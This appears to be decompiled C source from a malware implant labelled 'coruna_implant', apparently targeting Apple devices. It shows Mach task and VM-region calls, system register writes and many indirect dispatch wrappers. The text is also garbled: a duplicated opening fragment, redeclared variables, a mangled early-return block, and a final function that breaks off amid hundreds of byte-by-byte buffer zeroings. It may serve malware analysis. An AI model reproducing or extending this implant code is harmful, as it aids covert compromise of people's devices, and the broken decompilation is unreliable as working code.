    version = coruna_pthread_rwlock_unlock(kind,0x70004,str,(int)ls6 + 1);
    thread_attr[0] = 1;
    work = 0;
    cache_38[1] = '\0';
    cache_38[2] = '\0';
    version = coruna_mach_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot);
    if ((int)version == 0) {
    if ((work & 7) != 0) {
    cache_38[0] = '\0';
    flags = coruna_implant65fc_via_identity_6080(cache_38);
    if (flags != 0) {
    version = 0xad00b;
    if ((int)version == 0) {
    return version;
    }
    str = (char *)host_info[7];
    if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[7]);
    host_info[7] = 0;
    }
    str = (char *)host_info[9];
    if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[9]);
    host_info[9] = 0;
    }
    coruna_ctx_free_1c8fc(*host_info);
    *host_info = 0;
    coruna_ctx_free_9e78(serial_buf);
    return version;
    }
    if (cache_38[0] != '\0') {
    thread_attr[0] = 0;
    }
    }
    version = coruna_implant65fc_via_ctx_free_18dac(host_info + 1,host_info[3],0,*host_info,thread_attr,1);
    if ((int)version == 0) {
    *arg = serial_buf;
    }
    }
    }
    load_ok_29:
    if ((int)version == 0) {
    return version;
load_ok_28:
    thread_attr[0] = 1;
    work = 0;
    cache_38[1] = '\0';
    cache_38[2] = '\0';
    version = coruna_mach_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot);
    if ((int)version == 0) {
      if ((work & 7) != 0) {
        cache_38[0] = '\0';
        flags = coruna_implant65fc_via_identity_6080(cache_38);
        if (flags != 0) {
          version = 0xad00b;
          if ((int)version == 0) {
          return version;
          }
          str = (char *)host_info[7];
          if (str != (char *)0x0) {
          ls6 = _strlen(str);
          _bzero(str,ls6);
          _free((void *)host_info[7]);
          host_info[7] = 0;
          }
          str = (char *)host_info[9];
          if (str != (char *)0x0) {
          ls6 = _strlen(str);
          _bzero(str,ls6);
          _free((void *)host_info[9]);
          host_info[9] = 0;
          }
          coruna_ctx_free_1c8fc(*host_info);
          *host_info = 0;
          coruna_ctx_free_9e78(serial_buf);
          return version;
        }
        if (cache_38[0] != '\0') {
          thread_attr[0] = 0;
        }
      }
      version = coruna_implant65fc_via_ctx_free_18dac(host_info + 1,host_info[3],0,*host_info,thread_attr,1);
      if ((int)version == 0) {
        *arg = serial_buf;
      }
    }
  }
load_ok_29:
  if ((int)version == 0) {
    return version;
  }
  str = (char *)host_info[7];
  if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[7]);
    host_info[7] = 0;
  }
  str = (char *)host_info[9];
  if (str != (char *)0x0) {
    ls6 = _strlen(str);
    _bzero(str,ls6);
    _free((void *)host_info[9]);
    host_info[9] = 0;
  }
  coruna_ctx_free_1c8fc(*host_info);
  *host_info = 0;
load_ok_26:
  coruna_ctx_free_9e78(serial_buf);
  return version;
}





int coruna_implant65fc_via_ctx_free_9e78_3(long handle)
{
  int err;
  int status;
  int flags;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) && (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0)) {
    err = coruna_implant65fc_residual_90(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = (**(void (**)(ptr[1] + 0x10))();
    if (status != 0) {
      err = status;
    }
    flags = coruna_ctx_free_1c8fc(*ptr);
    if (err != 0) {
      flags = err;
    }
    status = coruna_ctx_free_9e78(handle);
    if (flags != 0) {
      status = flags;
    }
  }
  return status;
}





uint64_t coruna_implant65fc_via_run_starti(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  long addr;
  
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0 && addr_2 != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,addr_2);
    return u;
  }
  return 0xad001;
}





unsigned long coruna_implant65fc_via_run_starti_2(long arg,uint64_t val,uint64_t n,int m)

{
  uint u;
  uint size;
  unsigned long type_id_8;
  long base;
  long ctx_val;
  int cache_39;
  
  type_id_8 = 0xad001;
  if ((arg != 0) && (ctx_val = *(long *)(arg + 8), ctx_val != 0)) {
    if (*(char *)(ctx_val + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    base = *(long *)(ctx_val + 0x30);
    if (base == 0) {
      type_id_8 = coruna_run_starti(arg);
      if ((int)type_id_8 != 0) {
        return type_id_8;
      }
      base = *(long *)(ctx_val + 0x30);
    }
    cache_39 = 0;
    size = (**(void (**)(base + 0x38))(base,&cache_39);
    u = size;
    if (size == 0 && cache_39 != 1) {
      u = 0xad005;
    }
    type_id_8 = (unsigned long)u;
    if ((size == 0 && cache_39 != 1) && (m != 0)) {
      type_id_8 = (**(void (**)(*(long *)(ctx_val + 0x30) + 0x40))();
    }
    if ((int)type_id_8 == 0) {
      type_id_8 = (**(void (**)(*(long *)(ctx_val + 0x30) + 0x28))(*(long *)(ctx_val + 0x30),val,n)
      ;
    }
  }
  return type_id_8;
}





uint64_t coruna_implant_residual_47(long handle,uint64_t val)
{
  uint64_t u;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  bootargs = 0;
  scratch = 0;
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(handle + 0x68))(handle,0x20000,&bootargs,&scratch);
    if ((int)u == 0) {
      u = (**(void (**)(handle + 0x18))(handle,bootargs,scratch,val);
    }
  }
  return u;
}





uint64_t coruna_getcwd(long handle)
{
  char *ptr;
  long handle;
  uint64_t u;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch == 2) {
        ptr = _getcwd((char *)0x0,0);
        _chdir("/tmp");
        u = (**(void (**)(*(long *)(addr + 0x30) + 0x30))();
        if (ptr != (char *)0x0) {
          _chdir(ptr);
          _free(ptr);
        }
      }
      else {
        u = 0xad002;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_run_starti_3(long handle)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0 && scratch != 1) {
      u = (**(void (**)(*(long *)(addr + 0x30) + 0x40))();
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_run_starti_3(long handle,long addr_2,long off_3,long ctx_4,long ctx_5)
{
  uint64_t u;
  long handle;
  long addr;
  
  if ((handle != 0) &&
     (addr = *(long *)(handle + 8),
     (((addr != 0 && addr_2 != 0) && off_3 != 0) && ctx_4 != 0) && ctx_5 != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x20))(handle,addr_2,off_3,ctx_4,ctx_5);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_via_run_starti_4(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  long addr;
  
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0 && addr_2 != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x18))(handle,addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_via_run_starti_6(long handle,uint32_t *size)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0 && size != (uint32_t *)0x0)
     ) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    scratch = 0;
    u = (**(void (**)(handle + 0x18))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch - 7U < 2) {
        u = 0;
        *size = 2;
      }
      else {
        u = 0xad008;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_48(long handle,long addr_2,int flags,long off_3)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && flags != 0) && off_3 != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_49(long handle,long addr_2,char *path,long off_3)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
  if ((((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
      (indirect_target = *(void (**)(addr_2 + 0x30),
      indirect_target != (void (*)0x0 && path != (char *)0x0)) &&
     ((*path != '\0' && (off_3 != 0)))) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x30);
    }
    u = (*indirect_target)(addr_2,path,off_3);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_residual_91(long handle,long addr_2)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
  if (((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
     (indirect_target = *(void (**)(addr_2 + 0x28), indirect_target != (void (*)0x0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x28);
    }
    u = (*indirect_target)(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_50(long handle,uint64_t val,uint64_t *id_2,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && id_2 != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x18))(*ptr,val,&bootargs,&scratch);
      if ((int)u == 0) {
        *id_2 = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_residual_92(long handle,uint64_t val,long addr_2,int flags)
{
  uint64_t u;
  long *ptr;
  
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8), (ptr != (long *)0x0 && addr_2 != 0) && flags != 0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      u = (**(void (**)(*ptr + 0x30))();
      return u;
    }
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_51(long handle,uint64_t *val,uint32_t *size)
{
  uint64_t u;
  long *ptr;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(long **)(handle + 8),
     (ptr != (long *)0x0 && val != (uint64_t *)0x0) && size != (uint32_t *)0x0)) {
    if ((char)ptr[8] != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*ptr != 0) {
      bootargs = 0;
      scratch = 0;
      u = (**(void (**)(*ptr + 0x20))(*ptr,&bootargs,&scratch);
      if ((int)u == 0) {
        *val = bootargs;
        *size = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_52(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && id_2 != (uint64_t *)0x0)
     ) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle == 0) {
      u = 0xad00a;
    }
    else {
      u = (**(void (**)(handle + 0x18))(handle,val,&scratch);
      if ((int)u == 0) {
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_53(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x28))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_54(long handle,long addr_2,long off_3,int flags)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && off_3 != 0) && flags != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x40))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant_residual_55(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x30))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant65fc_residual_93(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x20))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant65fc_residual_94(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(handle + 0x18);
    if (handle != 0) {
      u = (**(void (**)(handle + 0x38))(handle);
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint64_t coruna_implant65fc_residual_95(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 8), handle != 0 && addr_2 != 0)) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    if (*(long *)(handle + 0x18) != 0) {
      u = coruna_implant65fc_residual_100(*(long *)(handle + 0x18));
      return u;
    }
    u = 0xad00a;
  }
  return u;
}





uint coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  uint u;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  char host_info [520];
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if ((handle == 0) || (*(long *)(handle + 8) == 0 || len == (size_t *)0x0))
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
  return u;
  }
  ___stack_chk_fail();
  if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
